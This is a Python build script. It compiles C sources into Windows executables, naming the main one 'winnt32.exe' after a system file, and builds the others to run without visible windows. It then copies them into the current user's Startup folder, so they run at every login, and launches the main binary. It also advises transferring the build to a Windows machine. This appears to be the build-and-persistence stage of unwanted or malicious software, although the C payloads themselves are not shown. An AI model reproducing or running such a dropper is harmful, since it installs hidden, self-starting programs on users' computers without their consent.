import subprocess
import sys
import os
import glob
import shutil
import platform

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
MAIN_SRC = os.path.join(SCRIPT_DIR, "start.c")
MAIN_EXE = os.path.join(SCRIPT_DIR, "winnt32.exe")
RC_FILE = os.path.join(SCRIPT_DIR, "winnt32.rc")
RC_OBJ = os.path.join(SCRIPT_DIR, "winnt32.res.o")

IS_WINDOWS = platform.system() == "Windows"

if IS_WINDOWS:
    GCC = "gcc"
    WINDRES = "windres"
else:
    GCC = "x86_64-w64-mingw32-gcc"
    WINDRES = "x86_64-w64-mingw32-windres"


def run(cmd):
    print(f">> {' '.join(cmd)}")
    subprocess.check_call(cmd, cwd=SCRIPT_DIR)


def build_resource():
    if not os.path.isfile(RC_FILE):
        print("[warn] winnt32.rc not found, skipping manifest embed")
        return None
    if shutil.which(WINDRES) is None:
        print("[warn] windres not found, skipping manifest embed")
        return None
    run([WINDRES, RC_FILE, "-O", "coff", "-o", RC_OBJ])
    return RC_OBJ


def build_main():
    print("[*] Building winnt32.exe from start.c ...")
    res_obj = build_resource()
    cmd = [
        GCC, MAIN_SRC,
        "-o", MAIN_EXE,
        "-municode", "-mwindows",
        "-lshell32", "-ladvapi32",
    ]
    if res_obj:
        cmd.insert(2, res_obj)
    run(cmd)
    print(f"[+] Built {MAIN_EXE}")


def build_others():
    sources = glob.glob(os.path.join(SCRIPT_DIR, "*.c"))
    sources = [s for s in sources if os.path.basename(s) != "start.c"]
    if not sources:
        print("[*] No additional .c files to build.")
        return []
    exes = []
    for src in sources:
        name = os.path.splitext(os.path.basename(src))[0] + ".exe"
        out = os.path.join(SCRIPT_DIR, name)
        print(f"[*] Building {name} from {os.path.basename(src)} ...")
        run([GCC, src, "-o", out, "-mwindows"])
        exes.append(out)
        print(f"[+] Built {out}")
    return exes


def register_startup(exes):
    if not IS_WINDOWS:
        print("[*] Not on Windows; skipping startup registration.")
        return
    if not exes:
        print("[*] No executables to register as startup.")
        return
    startup_dir = os.path.join(
        os.environ["APPDATA"],
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    os.makedirs(startup_dir, exist_ok=True)
    for exe in exes:
        dest = os.path.join(startup_dir, os.path.basename(exe))
        shutil.copy2(exe, dest)
        print(f"[+] Registered startup: {dest}")


def launch():
    if not IS_WINDOWS:
        print(f"[*] Not on Windows; cannot launch {MAIN_EXE}.")
        print("[*] Build complete. Transfer winnt32.exe to a Windows machine to run.")
        return
    print(f"[*] Launching {MAIN_EXE} ...")
    os.startfile(MAIN_EXE)


def main():
    build_main()
    other_exes = build_others()
    register_startup(other_exes)
    launch()
    print("[*] Done.")


if __name__ == "__main__":
    main()
